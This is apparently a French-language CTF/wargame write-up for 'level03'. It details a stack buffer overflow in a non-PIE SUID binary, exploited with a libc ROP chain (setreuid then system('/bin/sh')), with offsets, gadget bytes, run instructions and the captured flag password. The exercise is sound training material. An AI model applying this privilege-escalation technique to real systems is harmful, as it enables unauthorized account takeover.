# level03 — Stack overflow → ROP libc (`setreuid` + `system`)

Objectif : passer de `level03` à `flag03` et récupérer `/home/flag03/.pass`.

## Cible

Binaire `~/armitage` sur la VM : **SUID `flag03`** (uid 1020), non-PIE.
L'entrée commence par `JOB:` puis un buffer débordable.

| Protection | État |
|------------|------|
| PIE | **non** (EXEC, base `0x400000`) |
| Stack canary | absent |
| NX | **activé** → pas de shellcode en pile |
| SHSTK / IBT (CET) | **activés** → pas de ret2shellcode, ROP sur fonctions libc |
| ASLR | **0** → base libc fixe `0x7ffff7c00000` |

## Faille

Débordement sans canary ; le `saved RIP` est à **136 octets** du début de
l'entrée (`JOB:` + 124 + 8 de saved RBP). NX interdit le shellcode → on fait
du **ROP**. IBT impose que les cibles d'un appel indirect commencent par
`endbr64` : les fonctions libc conviennent, un ROP « classique » vers des
gadgets aussi (le `ret` reste permis ; seul le *shadow stack* contraint).

## Exploitation (ROP)

Cette libc **n'a pas de gadget `pop rdx`**, donc `execve(path, 0, 0)` (qui
exige `rdx=0`) est pénible. On contourne :

```
setreuid(1020, 1020)   ; ruid = euid = flag03
system("/bin/sh")      ; n'utilise que rdi -> aucun pop rdx requis
exit()
```

Point clé : `system()` lance `/bin/sh` = **dash**, qui **abandonne l'euid SUID
si ruid ≠ euid**. En faisant `setreuid(1020,1020)` **avant**, on a
`ruid == euid == flag03` → dash **garde** les privilèges → le shell lit le flag.

Chaîne :

```
[ 'JOB:' + 132 o de filler ][ ret (align 16) ]
[ pop rdi; ret | 1020 ][ pop rsi; ret | 1020 ][ setreuid ]
[ ret (align) ][ pop rdi; ret | &"/bin/sh" ][ system ][ exit ]
```

### Robustesse : tout est résolu dynamiquement

La libc de la VM peut être **mise à jour** (ses offsets bougent : on a vu
`execve` 0xeef30→0xef030, `setreuid` 0x1270d0→0x127370, `/bin/sh`
0x1cb42f→0x1cc42f). L'exploit ne code donc **rien en dur** : symboles
(`system`, `setreuid`, `exit`), chaîne `"/bin/sh"` et gadgets (`pop rdi; ret`
= `5f c3`, `pop rsi; ret` = `5e c3`) sont cherchés dans la libc au runtime.
Seule la base `0x7ffff7c00000` (ASLR off) est fixe.

### Le piège : lecture gourmande

`armitage` lit l'entrée **payload + ligne suivante** d'un coup. On envoie donc
une ligne **sacrificielle** (`id`) juste après le payload : elle est absorbée,
et `cat /home/flag03/.pass` arrive bien au `/bin/sh` obtenu.

## Utilisation

Depuis la machine locale (VM en écoute SSH, port 4242 par défaut) :

```sh
cd ressource
./run.sh                 # copie exploit.py dans ~ sur la VM et l'exécute LÀ-BAS
./run.sh <host> <port>   # cible personnalisée
```

Sur la VM directement :

```sh
python3 exploit.py
```

Sortie :

```
[+] flag03 = 8c33zqo7hytqnsx9h3nb4juf3rdjbd80
```

Ce flag est le mot de passe de `flag03` / `level04`.

## Fichiers

| Fichier | Rôle |
|---------|------|
| `ressource/run.sh` | Driver local : SSH, copie `exploit.py` dans `~` sur la VM puis l'exécute |
| `ressource/exploit.py` | Exploit pwntools (ROP `setreuid`+`system`, symboles/gadgets dynamiques) |
